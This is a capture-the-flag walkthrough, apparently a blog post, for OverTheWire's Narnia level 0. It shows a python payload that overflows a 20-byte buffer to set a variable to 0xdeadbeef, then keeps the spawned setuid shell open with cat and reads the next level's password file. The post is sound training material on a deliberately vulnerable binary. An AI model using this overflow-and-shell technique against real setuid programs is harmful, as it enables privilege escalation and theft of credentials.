The above C code is the source code for the first challenge in the Narnia series of challenges offered by Overthewire.org, these challenges have been designed to have basic vulnerabilities. The goal of this challenge is to get the val varible to equal “0xdeadbeef” and if so the binary will give me a shell. The binary accepts one string input from the user and puts the string into a buffer of 20 bytes, straight away this looks like a buffer overflow vulnerability with the goal of overflowing the buffer and then overwriting the value of the varible called “val” which currently is “0x41414141” with the value of “0xdeadbeef”.

So the next step I sent a string of A’s with 4 C’s to test the vulnerability, the buffer is defined as 20 bytes in size which means if there is actually a vulnerability in the code when the binary takes the user input and places it directly into the buffer and the user input is greater then 20 bytes there should be an overflow, which is why I include 4 C’s which should overwrite the val varible.

```
narnia0@melinda:/narnia$ ./narnia0
Correct val’s value from 0x41414141 -> 0xdeadbeef!
Here is your chance: AAAAAAAAAAAAAAAAAAAACCCC
buf: AAAAAAAAAAAAAAAAAAAACCCC
val: 0x43434343
WAY OFF!!!!
```

As I expected there was an overflow when I entered a string greater then 20 bytes long. Next I want to get code execution which will allow me to view the password for the next level. Since the binary should give me a shell when the val varible equals “0xdeadbeef” which means if I replace the 4 C’s to be “0xdeadbeef” I should be given a shell and then simply just be able to cat out the password file. So below I used python to create my string with the “0xdeadbeef” overwrite included which is piped into the narnia0 binary.

```
narnia0@melinda:~$ python -c'print "A"*20 + "\xef\xbe\xad\xde"' | /narnia/narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAï¾­Þ
val: 0xdeadbeef
```
DI successfully overwrite the val varible with “0xdeadbeef” but I was not given a shell, this is because the shell closes straight away.

```
narnia0@melinda:~$ python -c'print "A"*20 + "\xef\xbe\xad\xde"';id | /narnia/narnia0
AAAAAAAAAAAAAAAAAAAAï¾­Þ
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: uid=14000(narnia0)
val: 0x41414141
WAY OFF!!!!
```

I added an “id” command to be executed when the shell is be given, I can see the results of the command to be “uid=14000(narnia0)” but the results was not what I expected, again the command was executed after the shell from the binary had closed. I need to work out a way to keep the shell open. After running through a series of different commands I found the “cat” command kept the shell session open.

```
narnia0@melinda:/narnia$ (python -c'print "A"*20 + "\xef\xbe\xad\xde"'; cat) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
val: 0xdeadbeef
whoami
narnia1
id
uid=14000(narnia0) gid=14000(narnia0) euid=14001(narnia1) groups=14001(narnia1),14000(narnia0)
cat /etc/narnia_pass/narnia1
```
